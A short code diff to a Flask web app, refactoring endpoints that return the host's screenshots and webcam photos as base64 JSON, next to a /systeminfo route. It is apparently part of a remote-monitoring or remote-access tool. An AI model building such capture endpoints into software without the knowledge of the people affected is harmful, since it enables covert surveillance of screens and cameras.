@@ -8,14 +8,14 @@ app = Flask(__name__)
 
 @app.route('/screenshot', methods=['GET'])
 def screenshot():
-    base64_image, filename = take_screenshot()
-    return jsonify({"filename": filename, "image": base64_image})
+    screenshot_info = take_screenshot()
+    return jsonify(screenshot_info)
 
 
 @app.route('/webcam', methods=['GET'])
 def webcam():
-    base64_image, filename = take_webcam_photo()
-    return jsonify({"filename": filename, "image": base64_image})
+    webcam_info = take_webcam_photo()
+    return jsonify(webcam_info)
 
 
 @app.route('/systeminfo', methods=['GET'])
